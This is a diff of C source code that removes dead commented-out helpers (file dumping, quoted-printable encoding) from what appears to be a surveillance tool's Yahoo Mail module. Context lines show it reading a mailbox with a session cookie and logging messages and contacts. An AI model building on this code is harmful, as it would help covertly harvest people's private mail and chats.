@@ -21,50 +21,6 @@ extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 
-/*
-//writes data on disk
-void DumpYHTcpData(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize)
-{
-	HANDLE hFile;
-	DWORD dwWritten=0;
-
-	//creazione del file dove salvare i dati
-	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if(hFile == INVALID_HANDLE_VALUE)
-		return;
-
-	//scrittura dei dati sul file
-	if(!WriteFile(hFile, lpBuffer, dwSize, &dwWritten, NULL))
-	{
-		CloseHandle(hFile);
-		return;
-	}
-
-	CloseHandle(hFile);
-}
-
-//writes data on disk
-void DumpYHTcpData(LPCWSTR lpFileName, WCHAR* lpBuffer, DWORD dwSize)
-{
-	HANDLE hFile;
-	DWORD dwWritten=0;
-
-	//creazione del file dove salvare i dati
-	hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if(hFile == INVALID_HANDLE_VALUE)
-		return;
-
-	//scrittura dei dati sul file
-	if(!WriteFile(hFile, lpBuffer, dwSize*2, &dwWritten, NULL))
-	{
-		CloseHandle(hFile);
-		return;
-	}
-
-	CloseHandle(hFile);
-}
-*/
-
 LPVOID zalloc(__in DWORD dwSize)
 {
 	LPBYTE pMem = (LPBYTE) malloc(dwSize);
@@ -234,7 +190,6 @@ BOOL YHParseForParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strBuffer)
 //get connection parameters to use in next queries
 DWORD YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
 {
-	LPWSTR	strDomain		= L"mail.yahoo.com";
 	LPSTR	strRecvBuffer	= NULL;
 	LPWSTR	strURI			= NULL;
 	DWORD	dwRet, dwBufferSize;
@@ -662,12 +617,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 				_gmtime32_s(&tstamp, (__time32_t *)&pYHParams->dwLastMailDate);
 				tstamp.tm_year += 1900;
 				tstamp.tm_mon++;
-/*
-				if(!_wcsicmp(ChatFields.strMailUser, ChatFields.strAuthorID))
-					bIncoming = TRUE;
-				else
-					bIncoming = FALSE;
-*/
+
 				bIncoming = FALSE;
 				CheckProcessStatus();
 				LogSocialIMMessageW(CHAT_PROGRAM_YAHOO, ChatFields.strPeers, ChatFields.strPeersID, ChatFields.strAuthor, ChatFields.strAuthorID, ChatFields.strText, &tstamp, bIncoming);
@@ -3180,128 +3130,6 @@ BOOL IsEOL(WCHAR* pBuf)
 	return FALSE;
 }
 
-/*
-//ascii buffer to quoted printable conversion
-DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
-{		
-	LPSTR strMB=NULL, strTmpDest=NULL;
-	CHAR  strUTF[16];
-	CHAR ch;
-	DWORD i, dwNewSize, dwWR, j, dwLen, dwLine;
-	BOOL bEOL = FALSE;
-
-	//convertion to UTF charset
-	if(ConvertToUTF8(lpBuffer, &strMB) != YAHOO_SUCCESS)
-		return YAHOO_ERROR;
-
-	dwNewSize = dwSize+256;
-
-	//alloc a new buffer 256 byte bigger than the original
-	strTmpDest = (LPSTR)zalloc(dwNewSize);
-	if(strTmpDest == NULL)
-	{
-		znfree((LPVOID*)&strMB);
-		return YAHOO_ALLOC_ERROR;
-	}
-
-	SecureZeroMemory(strTmpDest, dwNewSize);
-
-	//conversion loop
-	for(dwLine=0, dwWR=0, i=0; i<dwSize; i++)
-	{
-		ch = strMB[i];
-
-		if(IsEOL(&strMB[i+1]))
-			bEOL = TRUE;
-		else
-			bEOL = FALSE;
-
-		if(ConvertChar(ch, bEOL))
-		{
-			AsciiCharToQP(strMB[i], strUTF);
-		}
-		else
-		{	
-			sprintf_s(strUTF, 8, "%c", ch);
-		}
-
-		//dwWR += wcslen(strUTF);
-		dwLen = strlen(strUTF);
-
-		if ((dwWR + dwLen) >= dwNewSize)
-		{			
-			strTmpDest = (LPSTR)realloc(strTmpDest, (dwNewSize+256));
-			if(strTmpDest == NULL)
-			{
-				znfree((LPVOID*)&strMB);
-				return YAHOO_ALLOC_ERROR;
-			}
-			strTmpDest[dwWR+dwLen] = 0;
-
-			dwNewSize += 256;
-		}
-
-		//wcscat(*lpUTFBuf, strUTF);
-
-		//copy chars to the new buffer and adds a "=\r\n" if the line exceeds 75 chars
-		for (j=0; strUTF[j] != 0; j++)
-		{
-			if ((dwLine == 73) && (dwWR > 0))
-			{
-				//if it's an encoded char, then write it exceeding the fixed length
-				if(dwLen > 1)
-				{
-					memcpy(&strTmpDest[dwWR], &strUTF[j], ((dwLen-j)*sizeof(WCHAR)));
-					dwWR += (dwLen-j);
-					strTmpDest[dwWR++] = L'=';
-					strTmpDest[dwWR++] = L'\r';
-					strTmpDest[dwWR++] = L'\n';
-
-					dwLine = 0;
-					break;
-				}
-				else
-				{
-					strTmpDest[dwWR++] = L'=';
-					strTmpDest[dwWR++] = L'\r';
-					strTmpDest[dwWR++] = L'\n';
-					strTmpDest[dwWR++] = strUTF[j];
-				}
-
-				dwLine = 0;
-			}
-			else
-				strTmpDest[dwWR++] = strUTF[j];
-
-			dwLine++;
-		}
-	}
-	znfree((LPVOID*)&strMB);
-
-	//null terminate the buffer
-	strTmpDest[dwWR++] = 0;
-
-	//convert from multibyte to wide char
-	dwSize = MultiByteToWideChar(CP_UTF8, 0, strTmpDest, -1, *lpUTFBuf, 0);
-	
-	//alloc required WCHARS	
-	*lpUTFBuf = (LPWSTR)zalloc(dwSize*sizeof(WCHAR));
-	if(*lpUTFBuf == NULL)
-	{	
-		znfree((LPVOID*)&strTmpDest);
-		return YAHOO_ALLOC_ERROR;
-	}
-
-	MultiByteToWideChar(CP_UTF8, 0, strTmpDest, -1, *lpUTFBuf, dwSize);
-
-	//free heap
-	znfree((LPVOID*)&strTmpDest);
-
-	return YAHOO_SUCCESS;
-}
-*/
-
-
 //ascii buffer to quoted printable conversion
 DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 {	
@@ -3430,39 +3258,6 @@ BOOL ConvertChar(WCHAR ch, BOOL bEOL)
 
 	return FALSE;
 }
-
-/*
-//verify if che char must be converted to utf
-BOOL ConvertChar(CHAR ch, BOOL bEOL)
-{
-	CHAR chTable1[] = "\t\r\n=";	//to be encoded
-	CHAR chTable2[] = "\t =";		//to be encoded only if the char is the last of the line
-	DWORD i;
-	
-	if(ch > 0x7F)
-		return TRUE;
-
-	if(bEOL == FALSE)
-	{
-		for(i=0; i<strlen(chTable1); i++)
-		{
-			if(ch == chTable1[i])
-				return TRUE;
-		}
-	}
-
-	if(bEOL == TRUE)
-	{
-		for(i=0; i<strlen(chTable2); i++)
-		{
-			if(ch == chTable2[i])
-				return TRUE;
-		}
-	}
-
-	return FALSE;
-}
-*/
 
 void znfree(__in LPVOID* pMem)
 { 
